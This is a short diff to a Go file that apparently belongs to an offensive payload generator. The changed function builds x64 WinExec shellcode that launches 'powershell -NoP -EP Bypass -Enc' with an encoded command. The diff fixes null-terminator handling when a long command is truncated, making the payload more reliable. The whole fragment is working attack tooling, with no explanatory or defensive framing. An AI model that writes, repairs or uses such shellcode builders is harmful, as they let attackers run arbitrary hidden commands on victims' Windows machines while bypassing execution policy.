@@ -19,12 +19,15 @@ func buildPowershellWinExecShellcode(encodedCmd string) []byte {
 func buildPowershellWinExecShellcodeX64(encodedCmd string) []byte {
 	cmd := "powershell -NoP -EP Bypass -Enc " + encodedCmd
 
-	// Ensure null-terminated UTF-16LE (WinExec expects ANSI, but we'll be safe)
+	// WinExec takes an ANSI command line; -Enc arguments are pure ASCII
+	// base64, so a plain NUL-terminated byte string is correct here.
 	cmdBytes := append([]byte(cmd), 0)
 
-	// If the command is too long, cap it
+	// Cap the command length, always keeping the NUL terminator intact
+	// (truncating it would make WinExec read past the pushed buffer).
 	if len(cmdBytes) > 32768 {
-		cmdBytes = cmdBytes[:32768]
+		cmdBytes = cmdBytes[:32767]
+		cmdBytes = append(cmdBytes, 0)
 	}
 
 	// Position-independent x64 WinExec shellcode
